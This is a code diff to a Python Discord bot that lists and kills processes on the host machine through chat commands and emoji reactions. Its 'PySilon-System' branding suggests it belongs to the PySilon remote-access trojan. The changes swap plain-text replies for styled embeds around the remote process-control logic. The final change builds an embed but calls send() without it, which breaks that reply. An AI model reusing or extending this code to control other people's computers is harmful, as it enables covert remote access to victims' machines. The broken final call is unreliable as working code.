@@ -15,7 +15,11 @@ elif str(reaction) == '💀' and reaction.message.content[:39] == '```Do you rea
                     break
             process_name = process_name[::-1]
     except Exception as e:
-        reaction_msg = await reaction.message.channel.send('```Error while parsing the process name...\n' + str(e) + '```')
+        embed = discord.Embed(title="📛 Error",description=f'```Error while parsing the process name...\n' + str(e) + '```', colour=0x8B0000)
+        embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+        
+        reaction_msg = await reaction.message.channel.send(embed=embed)
         await reaction_msg.add_reaction('🔴')
     try:
         killed_processes = []
@@ -26,10 +30,18 @@ elif str(reaction) == '💀' and reaction.message.content[:39] == '```Do you rea
         processes_killed = ''
         for i in killed_processes:
             processes_killed = processes_killed + '\n• ' + str(i)
-        reaction_msg = await reaction.message.channel.send('```Processes killed by ' + str(user) + ' at ' + current_time() + processes_killed + '```')
+        embed = discord.Embed(title="🟢 Succsess",description=f'```Processes killed by ' + str(user) + ' at ' + current_time() + processes_killed + '```', colour=0x013220)
+        embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+        
+        reaction_msg = await reaction.message.channel.send(embed=embed)
         await reaction_msg.add_reaction('🔴')
     except Exception as e:
-        reaction_msg = await reaction.message.channel.send('```Error while killing processes...\n' + str(e) + '```')
+        embed = discord.Embed(title="📛 Error",description='```Error while killing processes...\n' + str(e) + '```', colour=0x8B0000)
+        embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+        
+        reaction_msg = await reaction.message.channel.send(embed=embed)
         await reaction_msg.add_reaction('🔴')
         
 elif str(reaction) == '🔴' and reaction.message.content[-25:] == '.kill <process-number>```':
@@ -42,7 +54,11 @@ elif str(reaction) == '🔴' and reaction.message.content[-25:] == '.kill <proce
 elif message.content[:5] == '.show':
     await message.delete()
     if message.content.strip() == '.show':
-        reaction_msg = await message.channel.send('```Syntax: .show <what-to-show>```'); await reaction_msg.add_reaction('🔴')
+        embed = discord.Embed(title="📛 Error",description='```Syntax: .show <what-to-show>```', colour=0x8B0000)
+        embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+        
+        reaction_msg = await message.channel.send(embed=embed); await reaction_msg.add_reaction('🔴')
     else:
         if message.content[6:] == 'processes':
             processes, processes_list = [], []
@@ -77,17 +93,33 @@ elif message.content[:5] == '.kill':
     if len(processes_list) > 10:
         try: asd = int(message.content[6:]) + 1
         except:
-            reaction_msg = await message.channel.send('```Please provide a valid number of process from  .show processes```')
+            embed = discord.Embed(title="📛 Error",description=f'```Please provide a valid number of process from  .show processes```', colour=0x8B0000)
+            embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+            
+            reaction_msg = await message.channel.send(embed=embed)
             await reaction_msg.add_reaction('🔴')
             return
         if int(message.content[6:]) < len(processes_list) and int(message.content[6:]) > 0:
-            reaction_msg = await message.channel.send('```Do you really want to kill process: ' + processes_list[int(message.content[6:])].replace('`', '') + '\nReact with 💀 to kill it or 🔴 to cancel...```')
+            embed = discord.Embed(title="🟢 Succsess",description='```Do you really want to kill process: ' + processes_list[int(message.content[6:])].replace('`', '') + '\nReact with 💀 to kill it or 🔴 to cancel...```', colour=0x013220)
+            embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+            
+            reaction_msg = await message.channel.send(embed=embed)
             process_to_kill = [processes_list[int(message.content[6:])].replace('`', ''), False]
             await reaction_msg.add_reaction('💀')
             await reaction_msg.add_reaction('🔴')
         else:
-            reaction_msg = await message.channel.send("```There isn't any process with that index. Range of process indexes is 1-" + str(len(processes_list)-1) + '```')
+            embed = discord.Embed(title="📛 Error",description="```There isn't any process with that index. Range of process indexes is 1-" + str(len(processes_list)-1) + '```', colour=0x8B0000)
+            embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+            embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+            
+            reaction_msg = await message.channel.send(embed=embed)
             await reaction_msg.add_reaction('🔴')
     else:
-        reaction_msg = await message.channel.send('```You need to generate the processes list to use this feature\n.show processes```')
+        embed = discord.Embed(title="📛 Error",description='```You need to generate the processes list to use this feature\n.show processes```', colour=0x8B0000)
+        embed.set_author(name="PySilon-System", icon_url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+        embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/1124011814074732627/1133036905764761670/icon-1.png")
+        
+        reaction_msg = await message.channel.send()
         await reaction_msg.add_reaction('🔴')
